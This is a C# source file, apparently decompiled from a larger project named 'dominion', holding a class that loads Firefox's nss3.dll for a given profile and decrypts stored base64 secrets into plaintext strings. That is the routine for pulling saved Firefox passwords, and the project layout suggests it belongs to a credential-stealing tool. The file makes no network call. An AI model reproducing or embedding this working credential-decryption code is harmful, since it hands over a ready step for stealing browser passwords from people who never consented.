using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace dominion.src.dominion.Dependencies.Encryption
{
    public static class NSSDecryptor
    {
        // Token: 0x060002FF RID: 767
        [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int NSS_Init(string configdir);

        // Token: 0x06000300 RID: 768
        [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int NSS_Shutdown();

        // Token: 0x06000301 RID: 769
        [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int PK11SDR_Decrypt(ref NSSDecryptor.SECItem data, ref NSSDecryptor.SECItem result, int cx);

        // Token: 0x06000302 RID: 770 RVA: 0x00017A28 File Offset: 0x00015C28
        public static bool Initialize(string profilePath)
        {
            bool result;
            try
            {
                string text = "C:\\Program Files\\Mozilla Firefox";
                if (!Directory.Exists(text))
                {
                    result = false;
                }
                else
                {
                    string text2 = Environment.GetEnvironmentVariable("PATH");
                    text2 = text2 + ";" + text;
                    Environment.SetEnvironmentVariable("PATH", text2);
                    result = (NSSDecryptor.NSS_Init(profilePath) == 0);
                }
            }
            catch
            {
                result = false;
            }
            return result;
        }

        // Token: 0x06000303 RID: 771 RVA: 0x00017A8C File Offset: 0x00015C8C
        public static string Decrypt(string base64)
        {
            string result;
            try
            {
                byte[] array = Convert.FromBase64String(base64);
                if (array.Length == 0)
                {
                    result = null;
                }
                else
                {
                    NSSDecryptor.SECItem secitem = new NSSDecryptor.SECItem
                    {
                        Data = Marshal.AllocHGlobal(array.Length),
                        Len = array.Length,
                        Type = 0
                    };
                    Marshal.Copy(array, 0, secitem.Data, array.Length);
                    NSSDecryptor.SECItem secitem2 = default(NSSDecryptor.SECItem);
                    bool flag = NSSDecryptor.PK11SDR_Decrypt(ref secitem, ref secitem2, 0) != 0;
                    Marshal.FreeHGlobal(secitem.Data);
                    if (flag || secitem2.Data == IntPtr.Zero)
                    {
                        result = null;
                    }
                    else
                    {
                        byte[] array2 = new byte[secitem2.Len];
                        Marshal.Copy(secitem2.Data, array2, 0, secitem2.Len);
                        result = Encoding.UTF8.GetString(array2);
                    }
                }
            }
            catch
            {
                result = null;
            }
            return result;
        }

        // Token: 0x020000E3 RID: 227
        public struct SECItem
        {
            // Token: 0x040001D8 RID: 472
            public int Type;

            // Token: 0x040001D9 RID: 473
            public IntPtr Data;

            // Token: 0x040001DA RID: 474
            public int Len;
        }
    }
}
